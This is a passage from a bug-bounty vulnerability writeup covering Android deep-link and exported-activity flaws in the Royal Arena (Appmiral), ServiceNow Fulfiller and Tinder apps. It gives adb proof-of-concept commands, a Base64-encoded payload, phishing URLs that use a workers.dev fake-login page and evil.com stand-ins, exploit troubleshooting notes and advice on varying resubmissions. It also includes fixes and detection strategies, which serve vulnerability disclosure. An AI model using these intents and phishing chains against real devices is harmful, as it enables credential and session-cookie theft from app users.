1. Validate and restrict allowed URI schemes (`https` only).
2. Implement a strict whitelist of trusted domains.
3. Block dangerous schemes such as `content://`, `file://`, `tel://`, and `intent://`.
4. Set `android:exported="false"` if external access is unnecessary.
5. Protect the activity with a custom permission if external access is required.
6. Reject malformed or untrusted URIs before invoking `startActivity()`.

### Real-World References

* Android Intent Redirection Security Guidance
* OWASP Mobile Top 10 - Insecure Inter-App Communication
* Android Exported Component Security Best Practices
* MASVS-PLATFORM (OWASP Mobile Application Security Verification Standard)

---

## [VULN-029] Deep-Link JSON-Extras Relay → Arbitrary URL in JS+Cookie WebView (Royal Arena / Appmiral SDK)

**Category:** Deep Link / WebView (Exported Component + Intent Extras Relay)
**Affected Component:** `com.appmiral.splash.SplashActivity` (exported, custom scheme `appmiral-royalarena://`, NO host restriction) → `com.appmiral.base.tabs.MainActivity` (onCreate + onNewIntent) → inline `WebviewFragment` (Package: `dk.royalarena.app`)
**Severity:** High
**CVSS (estimated):** 7.5 (AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N) — phishing + cookie/DOM exfil from the app's own JS-enabled, cookie-sharing WebView; varies by program

### Root Cause
The exported `SplashActivity` accepts the custom scheme with no host restriction and copies the `Notification.Extra.RawLink` intent extra VERBATIM via `putExtras` into the launch intent. `MainActivity` reads that extra in `onCreate` AND `onNewIntent` (singleTask), deserializes it with the app's Gson instance into `ItemLink`, and dispatches on `ActionType`: `link_type:"link"` → `openInWebView()` → an inline `WebviewFragment` with `setJavaScriptEnabled(true)`, `CookieManager.setAcceptCookie(true)`, `setAcceptThirdPartyCookies(true)`, and DOM storage enabled. The URL is fully attacker-controlled and the JS+cookie-capable WebView is the app's own.

### Attack Prerequisites
- Malicious app installed (or `adb` shell) — no permissions
- Target: any app built on the Appmiral SDK with an exported scheme-no-host splash + RawLink relay
- The `isDeeplinkUri` host gate (host must equal `{edition}.deeplink.appmiral.com`) only applies to data-URI delivery; extras-based delivery bypasses it

### Exploitation Flow
1. Attacker builds an intent to the exported SplashActivity: `-d appmiral-royalarena://relay --es Notification.Extra.RawLink '{"url":"https://attacker/login","link_type":"link"}'` (or a malicious app constructs it).
2. SplashActivity forwards the extra verbatim; MainActivity parses it via Gson.
3. `executeAction` maps `link_type:"link"` → `openInWebView()` → `WebView.loadUrl(attacker URL)`.
4. Attacker page runs JS, reads `document.cookie` (shared CookieManager) / localStorage, or serves a phishing login that posts credentials to the attacker server (logged with Android UA).

### Proof of Concept (ON-DEVICE CONFIRMED 2026-09-26, SM-A705FN)
```bash
# Validated RawLink → WebView sink (Frida v2):
adb shell "am start -W -a android.intent.action.VIEW -d appmiral-royalarena://relay -n dk.royalarena.app/com.appmiral.splash.SplashActivity --es Notification.Extra.RawLink \"{\\\"url\\\":\\\"https://login-page.khoof555.workers.dev/fakeloginpage\\\",\\\"link_type\\\":\\\"link\\\"}\""
# Frida: [Splash.onCreate YOURS] -> [Splash.onStart YOURS] -> [Main.onNewIntent YOURS]
#  -> [Gson ItemLink(linkType=link)] -> [executeAction link] -> [getActionType link->Link]
#  -> [WebView.loadUrl https://login-page.khoof555.workers.dev/fakeloginpage]

# Validated openPage relay (simpler, no JSON):
adb shell am start -a android.intent.action.VIEW -d "appmiral-royalarena://open" --es "openPage" "https://attacker.example/login" -n dk.royalarena.app/com.appmiral.splash.SplashActivity
# Frida: [Splash.onCreate YOURS] -> [Main.onNewIntent YOURS] with extra[openPage]; then CoreApp.open routing
# Note: openPage is getStringExtra, NOT a URI query (?openPage= is wrong)
```

### Critical Delivery/Contract Traps (silent-failure causes)
1. **Field names are SNAKE_CASE** (`link_type`, `internal_url`, `android_app_url`, `android_app_id`, `android_app_fallback_url`, `requires_login`) — the app's Gson uses snake_case. camelCase keys are silently ignored → null fields → no-op.
2. **`link_type` value→sink map is empirical:** `link`→WebView (the sink), `internal_link`→CoreApp.open(internalUrl), `browser_link`→browser/CustomTabs, `external_app`→ACTION_VIEW/package launch.
3. **Shell transport mangles `{...}` JSON** (brace expansion, smart quotes) → `JsonSyntaxException` swallowed by try/catch → silent no-op. Verify what the app actually received via Frida hooks.

### Impact
- Phishing inside the app's own JS+cookie WebView (trusted domain/UI spoof, "re-login" pages) → credential capture
- Session-cookie / localStorage exfil for app domains via shared CookieManager
- DOM storage read; with a JS bridge → deeper app-logic abuse
- Variant `external_app` → arbitrary ACTION_VIEW / package launch (`tel:`, settings, other apps' exported surfaces)

### Chain Potential
- WebView + shared CookieManager → cookie exfil → account takeover (Critical chain)
- Attacker login page in-app → credential ATO
- + exported external_app variant → further app/system surface

### Detection Strategy
- **Static:** exported activity with custom scheme `<data android:scheme="..."/>` and NO host; `putExtras` forwarding; `Gson.fromJson(..., ItemLink.class)`; `executeAction`; `openInWebView`; `WebviewFragment`; `Notification.Extra.RawLink`.
- **Dynamic:** `am start -W` extras-based payload; Frida hooks on getStringExtra/Gson/executeAction/loadUrl; hook `FirebaseCrashlyticsService.logException` to detect swallowed parse failures.

### Fix Recommendation
1. Validate `link_type`/URL values server-side or restrict to allowlisted hosts before `openInWebView`.
2. Do not forward `Notification.Extra.*` verbatim across activities; treat RawLink as untrusted.
3. Restrict the custom scheme to a host (with assetlinks verification) and gate extras-delivered links identically to data-URI links.
4. Reject/ignore RawLink from non-notification sources (only accept from the app's own FCM service).
5. Disable JS/third-party cookies in WebViews rendering non-trusted content.

### Real-World References
- Android custom-scheme & exported-activity security guidance
- OWASP Mobile Top 10 — Insecure Inter-App Communication / Improper Platform Usage
- MASVS-PLATFORM — Inter-App Communication, WebView hardening

> **Duplicate advisory (Live Nation, Royal Arena, Aug-Sep 2026):** `SplashActivity appmiral-royalarena:// + RawLink link_type='link' → openInWebView` triaged as #3916189 (PII exfil). Resubmit of same chain (#3924922, phishing variant) closed duplicate per @h1_analyst_tennyson. Do NOT resubmit this exact chain on Live Nation/Appmiral targets — pivot to `openPage`, `external_app`, scheme-hijack, or escalated cookie-exfil proof.

---

## [VULN-030] Deep-Link Base64+Gson Params Relay → Arbitrary URL / SSO Instance-Switch (ServiceNow Fulfiller)

**Category:** Deep Link / Intent Injection (Exported Component + Base64-encoded JSON params relay)
**Affected Component:** `com.servicenow.mobilesky.deeplink.DeepLinkLaunchRedirectionActivity` (exported, custom schemes `agent` + `snagent`, NO host restriction, `taskAffinity="com.deeplink"`, `allowTaskReparenting="true"`) → `deeplink/e$a.c` LINK_ROUTING → `SingleTabActivity` → `deeplink/g.c` → `kf/l.a` Base64+Gson decode → `deeplink/g.d` action switch (Package: `com.servicenow.fulfiller`, ServiceNow FSM)
**Severity:** High (OPEN_URL relay / SSO-prefill chain); CVSS ~6.5-7.5 depending on program (attacker-controlled URL launch + forced instance/SSO navigation; no auth headers on the external-browser sink)
**CVSS (estimated):** 6.5 (AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:H/A:N) — varies; do NOT rate above High because the external-browser sink carries no app credentials

### Root Cause
An exported activity exposes `agent://` / `snagent://` custom schemes with NO host component. Its `onCreate` reads the entire `params` query parameter, Base64-decodes it (`Base64.decode(str,0)`, standard, UTF-8), and deserializes it with the app's own Gson instance into `DeepLinkParams` — FULLY attacker-controlled. `deeplink/g.d` then switches on the `action` enum:
- `open_url` → `u3.f(context, url)` → deep-link parser → `u3.i` external-browser branch (see trap below)
- `prefill` / `ssoPrefill` → `InstanceSwitchReason$PrefillInstance` → `LaunchActivity` SSO login flow for attacker-chosen instance
- `ulink` → `u3.q(url)` same-host gate + fetch (host-gated, lower risk)
- `redirect` / `launch_button` → `kf/c.e` REST fetch of attacker-supplied payload

### Attack Prerequisites
- Malicious app installed (or adb shell) — no permissions; OR web-delivered `snagent://` link (BROWSABLE + DEFAULT categories)
- **Instance gate:** `g.d` calls `p3.d(instanceId, false)` which compares `params.e()` (instanceId) case-insensitively against the CURRENTLY CONFIGURED environment name. If no match → `DeepLinkError` dialog, no URL open. So the OPEN_URL sink needs the attacker to know the target's configured instance name, OR target must be mid-`ssoPrefill` flow.

### Exploitation Flow
1. Attacker crafts JSON `{"instanceId":"<configured instance>","action":"open_url","url":"https://evil.com/mobileapplink?snapp=x"}` → Base64 → `snagent://launch?params=<b64>`.
2. Exported `DeepLinkLaunchRedirectionActivity` decodes params, validates instance via `p3.d`, dispatches `open_url`.
3. `u3.f` parses the URL; **trap:** the parser gate `kf/z0.c(uri)` requires hierarchical + http/https + FIRST path segment == `mobileapplink`, and `kf/z0.f` additionally requires the `snapp` query param to flip `isCustomSchemeMatch=true`.
4. `u3.i` cond_0 fires when `isCustomSchemeMatch && !isFirebaseLink` → `IntentFactory.e(url)` → `ACTION_VIEW` opens the ORIGINAL url string in the external browser (no app auth headers).
5. Alternative: `action:"ssoPrefill"` + attacker `instanceId`/`instanceUrl` → forced `LaunchActivity` SSO (OAuth) flow against attacker-controlled IdP host → phishing / token interception context.

### Proof of Concept (adb — open evil.com in external browser)
```bash
# JSON: {"instanceId":"<CONFIGURED_INSTANCE>","action":"open_url","url":"https://evil.com/mobileapplink?snapp=x"}
B64="eyJpbnN0YW5jZUlkIjoiPElOU1RBTkNFPiIsImFjdGlvbiI6Im9wZW5fdXJsIiwidXJsIjoiaHR0cHM6Ly9ldmlsLmNvbS9tb2JpbGVhcHBsaW5rP3NuYXBwPXgifQ=="
adb shell am start -W -a android.intent.action.VIEW -d "snagent://launch?params=$B64" com.servicenow.fulfiller
# Explicit component variant (no scheme-routing dependency):
adb shell am start -W -n com.servicenow.fulfiller/com.servicenow.mobilesky.deeplink.DeepLinkLaunchRedirectionActivity -d "snagent://launch?params=$B64"
```

### Critical Delivery/Contract Traps
1. **Plain `https://evil.com` does NOT reach the browser sink** — `kf/z0.c()` requires first path segment `mobileapplink`. Must use `https://evil.com/mobileapplink?snapp=x`. The `snapp=x` param is what makes `isCustomSchemeMatch=true` (`kf/z0.f` `e()`), and `u3.i` cond_0 then opens the ORIGINAL string.
2. **Instance gate blocks OPEN_URL without the configured instance name.** Get it from device settings / `dumpsys` before PoC, or the payload returns a DeepLinkError dialog.
3. `DeepLinkLaunchRedirectionActivity` fetches environment config first (`kq/b.f`) via `h0()` → success `F0` → `I0` → `l0` → `e$a.c`; failure `H0` still continues. Requires a valid app/env config on device.
4. Gson field names are the obfuscated class's serialized names (`instanceId`, `url`, `action`, `forceSsoId`, `customScheme`, `redirectPayload`); enum values snake_case: `launch_button`, `open_url`, `prefill`, `redirect`, `ssoPrefill`, `ulink`.

### Impact
- Attacker-driven URL launch in the app's trusted task context (phishing from app task, scheme-launch into other apps' exported surfaces)
- Forced SSO/instance-switch flow toward attacker-chosen IdP → OAuth token interception context (chain helper, not standalone ATO — PKCE+state present by default in AppAuth)
- `redirect`/`launch_button` → SSRF-ish REST fetch to attacker-supplied URL (server-side `kf/c.e`)

### Chain Potential
- OPEN_URL/ssoPrefill + OAuth PKCE/state → helper in an account-takeover chain
- redirect/launch_button REST fetch + internal API exposure → SSRF chain
- scheme-no-host + BROWSABLE → web-delivered phishing click → app task spoof

### Detection Strategy
- **Static:** exported activity with `<data android:scheme>` and NO host; `getQueryParameter("params")` + `Base64.decode` + `Gson.fromJson`; `DeepLinkParams`; `deeplink/g.d` action switch (`open_url`/`ssoPrefill`/`ulink`/`redirect`/`launch_button`); `kf/z0` parser (`mobileapplink`, `snapp`); `u3.i` cond_0; `IntentFactory.e` ACTION_VIEW.
- **Dynamic:** `am start -W` with Base64 params payload; logcat for SingleTabActivity/external-browser launch; Frida hooks on `kf/l.a` decode, `g.d`, `u3.f`, `IntentFactory.e`.
- **Rule-out:** if `p3.d(instanceId)` never matches (no configured instance) → OPEN_URL unreachable → downgrade; the Cabrillo/AuthenticatedWebView arm is host-gated by `u3.q`/`j1.e` (same-host), so attacker URLs DON'T get auth headers in-app.

### Fix Recommendation
1. Add host restriction + `autoVerify` to `agent`/`snagent` schemes; validate `params` server-side or with an HMAC.
2. Gate `open_url`/`ssoPrefill` actions on a signed/session-bound token, not just instance-name equality.
3. Re-validate scheme+host of the target URL before `IntentFactory.e`/`ACTION_VIEW`.
4. Treat `redirectPayload`/`launch_button` URLs as untrusted: allowlist fetch destinations.
5. Reject Base64 JSON params from non-app sources.

### Real-World References
- Android custom-scheme & exported-activity security guidance
- OWASP Mobile Top 10 — Insecure Inter-App Communication
- MASVS-PLATFORM — Inter-App Communication

## [VULN-031] Unauthenticated Intent Manipulation in AuthStart Activity Leads to Forced Logout and Application Disruption

**Category:** AndroidManifest (Exported Activity) / Authentication / Local Denial of Service

**Affected Component:** `com.tinder.feature.auth.internal.activity.AuthStartActivity`

**Package:** `com.tinder`

**Severity:** Medium (Proposed)

**CVSS (estimated):** 5.5 (AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:L)

### Root Cause

The authentication-related activity `com.tinder.feature.auth.internal.activity.AuthStartActivity` can reportedly be invoked externally through an explicit Android intent.

When launched while a user is authenticated, the activity triggers an authentication flow that reportedly terminates the existing session, logs the user out, and subsequently crashes the application.

This behavior suggests that the activity does not adequately handle externally initiated launches or prevent unauthorized authentication-state transitions.

**Note:** The activity's external accessibility and the reported logout/crash behavior should be confirmed against the target APK and its manifest before final submission.

### Attack Prerequisites

- The attacker can install or execute an application on the same Android device.
- The target Tinder application is installed.
- The victim is authenticated in Tinder for the forced-logout behavior to apply.
- No Tinder account credentials or authenticated session in the attacking application are required.
- The affected activity must be externally accessible under the tested conditions.

### Exploitation Flow

1. An attacker-controlled Android application targets `com.tinder.feature.auth.internal.activity.AuthStartActivity`.
2. The attacker invokes the activity using an explicit Android intent.
3. Tinder processes the externally initiated authentication flow.
4. The existing authenticated session is reportedly terminated.
5. Tinder subsequently crashes.
6. Repeated invocations reportedly reproduce the behavior, disrupting normal application usage.

### Proof of Concept

**ADB Reproduction:**

```bash
adb shell am start -n com.tinder/com.tinder.feature.auth.internal.activity.AuthStartActivity
```

**Expected Observations:**

- Tinder launches or transitions into its authentication flow.
- The authenticated session is terminated.
- The application crashes after the session transition.
- Repeating the command reproduces the observed behavior.

Capture the relevant Logcat output and verify the session state before and after execution to substantiate the logout and crash claims.

### Impact

- **Forced Logout:** An external application may terminate the victim's existing authenticated Tinder session.
- **Local Denial of Service:** The activity reportedly crashes Tinder after invocation.
- **Repeated User Disruption:** Repeated invocation may interrupt normal application usage.
- **Cross-Application Attack Surface:** Another application on the same device may trigger the behavior without interacting directly with Tinder's UI.

The demonstrated impact is limited to the local Android device unless additional evidence establishes a broader effect. The report does not establish remote exploitation, account takeover, or server-side compromise.

### Chain Potential

Further investigation could determine whether other exported authentication activities or deep-link handlers expose similar authentication-state transitions.

No additional vulnerability chain should be claimed unless independently demonstrated.

### Detection Strategy

- **Static Analysis:** Inspect `AndroidManifest.xml` for the activity's `android:exported` value and applicable intent filters.
- **Dynamic Analysis:** Invoke the activity while logged in and record the resulting authentication state and application behavior.
- **Logcat Analysis:** Capture the exception and stack trace associated with the reported crash.
- **Authentication Review:** Trace the code paths responsible for session invalidation and determine whether they are triggered by activity creation, intent processing, or another authentication event.
- **Caller Validation:** Determine whether the application validates the origin or legitimacy of externally initiated requests.

### Fix Recommendation

1. **Restrict External Access:** If the activity is intended exclusively for internal authentication flows, set `android:exported="false"` and remove unnecessary external entry points.
2. **Validate External Requests:** If external invocation is required, validate incoming intent data and enforce appropriate trust boundaries.
3. **Protect Authentication State:** Do not invalidate an authenticated session solely because the activity was launched externally.
4. **Handle Unexpected Intents Safely:** Reject invalid or unauthorized requests without crashing the application.
5. **Add Regression Tests:** Verify that direct external invocation cannot trigger unauthorized logout or application crashes.

### Evidence

- **Reproduction Command:** The ADB command provided above.
- **PoC Video:** Attach the recording demonstrating the behavior.
- **Additional Evidence Recommended:** Relevant manifest entry, before-and-after authentication state, and Logcat stack trace.

### Real-World References

- No external reference or previously published report is asserted here. Add a reference only if a directly relevant, verifiable source is identified.

---